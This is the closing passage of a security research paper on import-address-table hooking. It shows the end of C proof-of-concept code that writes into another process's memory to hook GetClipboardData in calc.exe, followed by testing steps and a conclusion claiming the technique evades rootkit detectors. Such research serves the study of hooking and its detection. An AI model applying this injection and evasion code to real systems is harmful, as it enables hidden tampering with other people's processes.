font-family:&quot;Courier New&quot;"> (!<span style="color:#010001">bSuccess</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">{</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">printf</span>(<span style="color:#A31515">"Error writing process memory"</span>);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span> <span style="color:#010001">FALSE</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">}</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">printf</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;">(<span style="color:#A31515">"Handler
address: 0x%p\r\n"</span>, <span style="color:#010001">dwHandlerAddress</span>);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">LPVOID</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">pAddress</span>
= (<span style="color:#010001">LPVOID</span>)((<span style="color:#010001">DWORD</span>)<span style="color:#010001">pPEB</span>-&gt;<span style="color:#010001">ImageBaseAddress</span>
+ </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">descriptor</span>.<span style="color:#010001">FirstThunk</span> + (<span style="color:#010001">dwOffset</span>
* <span style="color:blue">sizeof</span>(<span style="color:#010001">IMAGE_THUNK_DATA32</span>)));</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:green">// Write IAT</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">bSuccess</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;"> = <span style="color:#010001">WriteProcessMemory</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">(</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pAddress</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;<span style="color:#010001">dwHandlerAddress</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4, </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:blue">if</span><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;"> (!<span style="color:#010001">bSuccess</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">{</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">printf</span>(<span style="color:#A31515">"Error writing process memory"</span>);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span> <span style="color:#010001">FALSE</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">}&nbsp;&nbsp;&nbsp;&nbsp; </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9"><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;;
color:blue">return</span><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;">
<span style="color:#010001">TRUE</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Making the
call to hook the function is simple enough. All we need is the target process
Id, module name, function name, handler, and handler size.</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">HookFunction</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">(</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">dwProcessId</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"user32.dll"</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"GetClipboardData"</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">handler</span>, </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x100</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9"><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;">);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Testing The Proof Of Concept</span></b></p>

<p class="MsoNormal" style="line-height:normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black">Compile the application (see resources for download information).
Before running it, ensure that an instance of calculator is running. Run the application
and it will attempt to hook the first process named calc.exe that it
encounters. Confirm that no errors occurred. Output from successful injection
should look similar to this:</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">Original</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">import</span> <span style="color:#010001">address</span>: 0x762F715A</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">Handler</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">address</span>:
0x76318300</span></p>

<p class="MsoNormal" style="line-height:normal;background:#D9D9D9"><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;;color:#010001">Press</span><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">any</span>
<span style="color:#010001">key</span> <span style="color:#010001">t</span><span style="color:black">o continue . . .</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">To test the
hook use the calculators paste feature. Upon doing so a message box should
appear. When the message box is closed calculator should resume functioning as
expected. </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">&nbsp;</span></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Conclusion</span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">While much
progress has been made in hooking detection, the IAT hooking described in this
paper demonstrates that established rootkit detecting applications can be
circumvented using variations of established techniques. It is very likely that
applying the same methods to different forms of hooking such as EAT hooking or
inline hooking will result in similar improvements.</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">&nbsp;</span></p>

<p class="MsoNormal" style="line-height:normal"><b><span style="font-size:14.0pt;
font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Resources</span></b></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">IAT Hooking
Revisited Proof Of Concept Source</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><a href="http://code.google.com/p/iat-hooking-revisited/"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">http://code.google.com/p/iat-hooking-revisited/</span></a></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">The Rootkit Arsenal:
Escape and Evasion in the Dark Corners of the System</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><a href="http://www.amazon.com/Rootkit-Arsenal-Escape-Evasion-Corners/dp/1598220616"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">http://www.amazon.com/Rootkit-Arsenal-Escape-Evasion-Corners/dp/1598220616</span></a></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Malware Analyst's
Cookbook and DVD: Tools and Techniques for Fighting Malicious Code</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><a href="http://www.amazon.com/Malware-Analysts-Cookbook-DVD-Techniques/dp/0470613033"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">http://www.amazon.com/Malware-Analysts-Cookbook-DVD-Techniques/dp/0470613033</span></a></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Microsoft PE and COFF
Specification</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><a href="http://msdn.microsoft.com/en-us/windows/hardware/gg463119"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">http://msdn.microsoft.com/en-us/windows/hardware/gg463119</span></a></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">Packet Storm</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><a href="http://packetstormsecurity.org/"><span style="font-family:
&quot;Arial&quot;,&quot;sans-serif&quot;">http://packetstormsecurity.org/</span></a></p>

</div>

<div style="position:absolute;filter:alpha(opacity=0);opacity:0.001;z-index:10;">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         </div>


</body></html>